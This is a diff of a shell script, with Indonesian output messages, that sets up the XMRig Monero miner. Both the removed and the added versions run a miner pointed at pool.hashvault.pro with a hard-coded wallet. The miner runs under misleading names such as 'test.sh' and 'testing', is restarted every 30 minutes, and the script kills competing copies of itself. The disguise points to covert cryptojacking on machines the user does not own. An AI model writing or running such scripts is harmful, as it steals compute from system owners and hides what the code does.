@@ -1,168 +1,45 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz && tar -xzvf xmrig-6.25.0-linux-static-x64.tar.gz && cd xmrig-6.25.0 && cat <<'EOF' > test.sh
 #!/bin/bash
+SELF_PID=$$
 
-set -e
+OTHER_PIDS=$(ps -ef | grep "[t]est.sh" | awk '{print $2}' | grep -vw "$SELF_PID")
 
-echo "[1] Update & install dependencies..."
-sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools cpulimit
+if [ -n "$OTHER_PIDS" ]; then
+    echo "Ditemukan instance test.sh lain: $OTHER_PIDS"
+    echo "Menghentikan proses..."
+    mv test.sh test1.sh
+    kill -9 $OTHER_PIDS
+    mv test1.sh test.sh
+fi
 
-echo "[2] Clone xmrig..."
-git clone https://github.com/xmrig/xmrig.git || true
+echo "Tidak ada instance lain, lanjut..."
 
-cd xmrig
-
-echo "[3] Build xmrig..."
-mkdir -p build
-cd build
-
-cmake ..
-make -j$(nproc)
-
-echo "[4] Create config.json..."
-
-cat > config.json << 'EOF'
-{
-    "api": {
-        "id": null,
-        "worker-id": null
-    },
-
-    "http": {
-        "enabled": false,
-        "host": "127.0.0.1",
-        "port": 0,
-        "access-token": null,
-        "restricted": true
-    },
-
-    "autosave": true,
-    "background": false,
-    "colors": true,
-    "title": true,
-
-    "randomx": {
-        "init": -1,
-        "init-avx2": -1,
-        "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
-        "cache_qos": false,
-        "numa": true,
-        "scratchpad_prefetch_mode": 1
-    },
-
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "priority": 3,
-        "yield": true,
-        "asm": true,
-        "max-threads-hint": 70
-    },
-
-    "opencl": {
-        "enabled": false
-    },
-
-    "cuda": {
-        "enabled": false
-    },
-
-    "donate-level": 1,
-
-    "pools": [
-        {
-            "url": "pool.hashvault.pro:80",
-            "user": "483fbQV9MFUQp3VufiihswFWwKV693sWFcEMVEbEE5yVhsT65Re3tgb3SHcJMXwoKDHMaLtYdA5AkdGjCSaxKbzoNRtnr1M",
-            "pass": "x",
-            "keepalive": true,
-            "enabled": true
-        }
-    ]
-}
-EOF
-
-echo "[5] Create run_testing.sh..."
-
-cat > run_testing.sh << 'EOF'
-#!/bin/bash
+COMMAND="./xmrig --url pool.hashvault.pro:443 --user 483fbQV9MFUQp3VufiihswFWwKV693sWFcEMVEbEE5yVhsT65Re3tgb3SHcJMXwoKDHMaLtYdA5AkdGjCSaxKbzoNRtnr1M --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+RESTART_EVERY=1800
 
 while true
 do
-    echo "Starting testing..."
-
-    exec -a testing cpulimit -l 70 -- ./xmrig/build/run_testing.sh &
-
+    echo "Menjalankan command: $COMMAND"
+    $COMMAND &
     PID=$!
 
-    sleep 1500
+    echo "PID berjalan: $PID"
+    echo "Menunggu 30 menit..."
+    sleep $RESTART_EVERY
 
-    echo "Restarting testing..."
+    echo "Kill PID: $PID"
+    kill $PID 2>/dev/null
 
-    kill $PID 2>/dev/null || true
     sleep 5
-    kill -9 $PID 2>/dev/null || true
+    if ps -p $PID > /dev/null; then
+        echo "PID masih hidup, force kill"
+        kill -9 $PID
+    fi
 
-    sleep 2
-done
-EOF
-
-chmod +x run_testing.sh
-
-echo "[6] Create test.sh..."
-
-cat > test.sh << 'EOF'
-#!/bin/bash
-
-while true
-do
-    echo "===== $(date) ====="
-
-    echo "--- ip a ---"
-    ip a
-
-    echo "--- ifconfig ---"
-    ifconfig
-
-    echo "===================="
-
-    sleep 240
+    echo "Restart command..."
+    echo "-----------------------------"
 done
 EOF
 
 chmod +x test.sh
-
-echo "[7] Create keepalive.sh..."
-
-cat > keepalive.sh << 'EOF'
-#!/bin/bash
-
-while true
-do
-    date > /dev/null
-    echo "keep-alive $(date)"
-    sleep 60
-done
-EOF
-
-chmod +x keepalive.sh
-
-echo "[8] Start screen sessions..."
-
-screen -dmS testing bash -c "./run_testing.sh"
-screen -dmS test bash -c "./test.sh"
-screen -dmS keepalive bash -c "./keepalive.sh"
-
-echo ""
-echo "=============================="
-echo "✅ Setup selesai!"
-echo ""
-echo "Cek screen:"
-echo "screen -ls"
-echo ""
-echo "Masuk screen:"
-echo "screen -r testing"
-echo "screen -r test"
-echo "screen -r keepalive"
-echo "=============================="
+./test.sh
